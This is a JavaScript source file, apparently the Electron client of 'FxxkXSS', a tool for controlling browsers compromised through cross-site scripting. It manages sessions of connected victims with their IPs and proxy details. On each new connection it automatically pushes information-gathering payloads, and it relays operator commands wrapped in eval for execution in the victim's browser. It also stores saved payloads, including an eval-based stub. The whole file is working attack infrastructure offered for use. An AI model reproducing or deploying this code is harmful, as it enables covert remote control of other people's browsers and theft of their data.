import Store from 'electron-store';
const store = new Store();

/**
 * 监听从主进程来的消息
 */

import { ipcRenderer } from 'electron';
import { directives } from './directive';

//消息侦听器缓存
let listener = [];

//现有连接
const cons = [];
const deccons = {};

//新连接侦听器
const new_con_listener = [];
//关闭连接侦听器
const close_con_listener = [];

export const index2id = index => {
    return log.sessions[index].id;
}

export const id2index = id => {
    return deccons[id.toString()];
}

//payload
export const payloads = store.get('config.payloads', {
    payloads : [{
        code : 'const a = 1;',
        title : 'screen_shot',
    }, {
        code : 'function send(data){ eval(data); }',
        title : 'go!'
    }],
    current_id : 0
});

export const savePayloads = () => {
    store.set('config.payloads', payloads);
}

//log
export const log = {
    sessions : [
        {
            id : 999999999999,
            alive : true,
            logs : [{
                log : '[ NEW-CON ]:-1:GOT A NEW CONNECTION',
                class_name : 'green'
            }, {
                log : '[ LOG ]: 欢迎使用FxxkXSS，跟进最新的功能：https://github.com/Yeuoly/FxxkXSS',
                class_name : 'grey'
            }, {
                log : '[ TIP ]: 吃人啦吃人啦，开发团队招人啦',
                class_name : 'grey'
            }],
            ip : '127.0.0.1',
            proxy_domain : {
                proxy_host : '',
                proxy_port : '',
                proxy_server_name : ''
            }
        },
    ],
    current_index : 0,
}

export const getSession = id => log.sessions[id2index(id)];

export const getCurrentIndex = () => log.current_index;

export const isAlive = id => {
    const session = getSession(id);
    if(session){
        return session.alive;
    }
    return false;
}


export const addNewLog = (id, block, msg, color) => {
    getSession(id).logs.push({
        log : `[ ${block.toUpperCase()} ]:${msg}`,
        class_name : color
    });
}

//创建主要的事件侦听
ipcRenderer.on('xss_core.newcon', (ev, msg) => {
    cons.push({
        id : msg['id'],
    });
    //添加从id到index的映射
    deccons[msg['id'].toString()] = log.sessions.length;
    //添加新的log
    log.sessions.push({
        alive : true,
        //从index到id的映射
        id : msg['id'],
        logs: [{
            log : `[ NEW-CON ]:${msg['id']}:GOT A NEW CONNECTION`,
            class_name : 'green'
        },{
            log : `[ NEW-CON ]: 该对话的代理服务器为：${msg['info']['proxy_domain']}`,
            class_name : 'green'
        }],
        ip : msg['info']['ip'],
        proxy_domain : {
            host : msg['info']['proxy_host'],
            port : msg['info']['proxy_port'],
            server_name : msg['info']['proxy_server_name']
        }
    });
    new_con_listener.forEach( e => e(msg['id']) );
    //加载好侦听器以后直接发送几条比较重要的信息收集payload
    ipcRenderer.send('xss_core.sendmsg', { id : msg['id'], data : `window.cachex.send(eval("${directives[1].payload}"))`, type : 'command' });
    ipcRenderer.send('xss_core.sendmsg', { id : msg['id'], data : `window.cachex.send(eval("${directives[4].payload}"))`, type : 'command' });
});
ipcRenderer.on('xss_core.close', (ev, msg) => {
    //获取index
    const index = id2index(msg['id']);
    if(!index) return;

    listener = listener.filter( e => {
        return e.id !== msg['id'];
    });
    close_con_listener.forEach( e => {
        if(e.id == msg['id']){
            e.handler();
        }
    });
    getSession(msg['id']).alive = false;
});

ipcRenderer.on('xss_core.sendmsg', (ev, msg) => {
    listener.forEach( e => {
        if(e.id === msg['id']){
            e.handler(msg['data']);
        }
    });
});

export const addXSSListener = (id, handler) => {
    //首先判断这个id的con活着不
    for(const i of cons){
        if(i.id === id){
            listener.push({
                id, handler
            });
            break;
        }
    }
}

export const addNewConListener = cb => {
    new_con_listener.push(cb);
}

export const addCloseConListener = (id, handler) => {
    close_con_listener.push({
        id, handler
    });
}

export const evalOneLineByIndex = (index, command) => {
    //检测是否是指令
    for(const i of directives){
        if(i.directive === command.substr(0, i.directive.length)){
            //检测payload类型
            switch(typeof i.payload){
                case 'string':
                    command = i.payload;
                    break;
                case 'function':
                    command = i.payload(command.split(/[ ]/g).slice(1));
                    break;
                case 'object':
                    const id = index2id(index);
                    if(id === undefined) return;
                    i.payload.handler(getSession(id), command.split(/[ ]/g).slice(1));
                    return;
            }
            break;
        }
    }
    const id = index2id(index);
    for(const i of cons){
        if(i.id === id){
            ipcRenderer.send('xss_core.sendmsg', {
                id : id,
                data : `window.cachex.send(eval("${command}"))`,
                type : 'command'
            });
            addNewLog(id, 'command', `sent command : ${command}`, 'grey');
            break;
        }
    }
}

export const evalMultByIndex = (index, command, payload_name) => {
    const id = index2id(index);
    for(const i of cons){
        if(i.id === id){
            ipcRenderer.send('xss_core.sendmsg', {
                id : id,
                data : command,
                type : 'command'
            });
            addNewLog(id, 'command', `sent payload : ${payload_name}`, 'grey');
            break;
        }
    }
}